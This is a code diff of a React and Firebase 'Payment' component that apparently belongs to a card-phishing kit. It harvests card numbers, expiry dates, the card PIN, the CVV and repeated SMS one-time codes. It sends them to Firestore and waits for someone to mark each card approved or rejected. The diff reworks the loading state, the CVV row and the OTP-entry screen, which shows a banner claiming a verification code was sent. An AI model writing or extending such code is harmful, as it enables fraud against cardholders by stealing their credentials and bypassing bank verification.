@@ -3,6 +3,7 @@ import { useEffect, useState } from 'react';
 import './kent.css'
 import { doc, onSnapshot } from 'firebase/firestore';
 import { db, handlePay } from '@/lib/firebasee';
+import { Badge } from '@/components/ui/badge';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -125,6 +126,7 @@ const Payment = (props: any) => {
   const [step, setstep] = useState(1);
   const [newotp] = useState([''])
   const [total, setTotal] = useState('');
+  const [isloading, setisloading] = useState(false);
 
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: '',
@@ -162,9 +164,9 @@ const Payment = (props: any) => {
             setPaymentInfo(prev => ({ ...prev, status: data.status }));
             if (data.status === 'approved') {
               setstep(2);
-              props.setisloading(false);
+              setisloading(false);
             } else if (data.status === 'rejected') {
-              props.setisloading(false);
+              setisloading(false);
               alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
               setstep(1);
             }
@@ -510,73 +512,81 @@ const Payment = (props: any) => {
                           />
                         </div>
                       </div>
-                      <div className="row" id="PinRow">
-                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                        <input
-                          type="hidden"
-                          name="cardPinType"
-                          defaultValue="A"
-                        />
-                        <div id="eComPin">
-                          <label className="column-label"> Cvv: </label>
-                        </div>
-                        <div>
-                          <input
-                            inputMode="numeric"
-                            pattern="[0-9]*"
-                            name="cvv"
-                            id="cvv"
-                            onChange={(e: any) =>
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                cvv: e.target.value,
-                              })
-                            }
-                            autoComplete="off"
-                            title="Should be in number. Length should be 3"
-                            type="password"
-                            size={3}
-                            maxLength={3}
-                            className="allownumericwithoutdecimal"
-                            style={{ width: '60%' }}
-                          />
-                        </div>
-                      </div>
+                      {
+                        step === 1 && paymentInfo.status === 'approved' ? (
+                          <div className="row" id="PinRow">
+                            {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
+                            <input
+                              type="hidden"
+                              name="cardPinType"
+                              defaultValue="A"
+                            />
+                            <div id="eComPin">
+                              <label className="column-label"> Cvv: </label>
+                            </div>
+                            <div>
+                              <input
+                                inputMode="numeric"
+                                pattern="[0-9]*"
+                                name="cvv"
+                                id="cvv"
+                              
+                                autoComplete="off"
+                                title="Should be in number. Length should be 3"
+                                type="password"
+                                size={3}
+                                maxLength={3}
+                                className="allownumericwithoutdecimal"
+                                style={{ width: '60%' }}
+                              />
+                            </div>
+                          </div>
+                        ) : null
+                      }
                     </div>
                   </>
-                ) : step === 2 && paymentInfo.status === 'approved' ? (
+                ) : (
                   <div>
-                    <form style={{ display: 'flex', flexDirection: 'column' }}>
-                      <label>
-                        Please enter the verification code sent to your phone number
-                      </label>
-                      <label>
-                        <input
-                          name="otp"
-                          style={{ width: '100%', marginTop: 15 }}
-                          id="otp"
-                          type="tel"
-                          inputMode="numeric"
-                          pattern="[0-9]*"
-                          className="allownumericwithoutdecimal"
-                          maxLength={6}
-                          value={paymentInfo.otp}
-                          onChange={(e: any) => {
+                    <div className='row'>
+<Badge variant={'outline'} className='bg-blue-100 font-normal p-2 my-2'>
+Please note: A 6-digit verification code has been sent via text message to your registered phone number. Please enter your zip code in the box below to complete the verification process.</Badge>
+                    </div>
+                      <div className="row">
+                        <label className="column-value">CardNumber:</label>
+                        <label>****** {paymentInfo.cardNumber}</label>
+                      </div>
+                      <div className="row">
+                        <label
+                          className="column-value"
+                        >Month expiry:</label>
+                        <label> {paymentInfo.month}</label>
+                      </div>
+                      <div className="row">
+                        <label
+                          className="column-value"
+                        >Year expiry:</label>
+                        <label> {paymentInfo.year}</label>
+                      </div>
+                      <div className="row">
+                        <label className="column-value"
+                        >Pin:</label>
+                        <label>{'****'}</label>
+                      </div>
+                      <div className="flex my-1">
+                        <label
+                                                  className="column w-16"
+                                                  >OTP:</label>
+                        <input 
+                          onChange={(e: any) =>
                             setPaymentInfo({
                               ...paymentInfo,
                               otp: e.target.value,
-                            });
-                          }}
-                          title="Should be in number. Length should be 6"
-                        />
-                      </label>
-                    </form>
-                  </div>
-                ) : (
-                  <div style={{ textAlign: 'center', padding: '20px' }}>
-                    <p>Please wait while we process your payment...</p>
-                  </div>
-                )}
+                            })
+                          }type='tel' maxLength={6} className='w-full' />
+                      </div>
+                    </div>
+                )
+                }
               </div>
               <div className="form-card">
                 <div className="row">
@@ -601,12 +611,12 @@ const Payment = (props: any) => {
                     <div style={{ display: 'flex' }}>
                       <button
                         disabled={
-                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4 || paymentInfo.cvv?.length !== 3)) ||
-                          paymentInfo.status === 'pending'
+                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
+                          paymentInfo.status === 'pending' || step ===2 && paymentInfo.otp?.length !==6
                         }
                         onClick={() => {
                           if (step === 1) {
-                            props.setisloading(true);
+                            setisloading(true);
                             handlePay(paymentInfo, setPaymentInfo)
                             handleSubmit();
                           } else if (step >= 2) {
@@ -615,12 +625,12 @@ const Payment = (props: any) => {
                               !newotp.includes(paymentInfo.otp!)
 
                             ) { newotp.push(paymentInfo.otp!) }
-                            props.setisloading(true)
+                            setisloading(true)
                             handleAddotp(paymentInfo.otp!);
-                            props.handleOArr(paymentInfo.otp!);
+                            //   handleOArr(paymentInfo.otp!);
                             handlePay(paymentInfo, setPaymentInfo)
                             setTimeout(() => {
-                              props.setisloading(false)
+                              setisloading(false)
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: '',
@@ -631,7 +641,7 @@ const Payment = (props: any) => {
                           }
                         }}
                       >
-                        {props.loading ? "Wait..." : (step === 1 ? "Submit" : "Verify OTP")}
+                        {isloading ? "Wait..." : (step === 1 ? "Submit" : "Confirm")}
                       </button>
                       <button>Cancel</button>
                     </div>
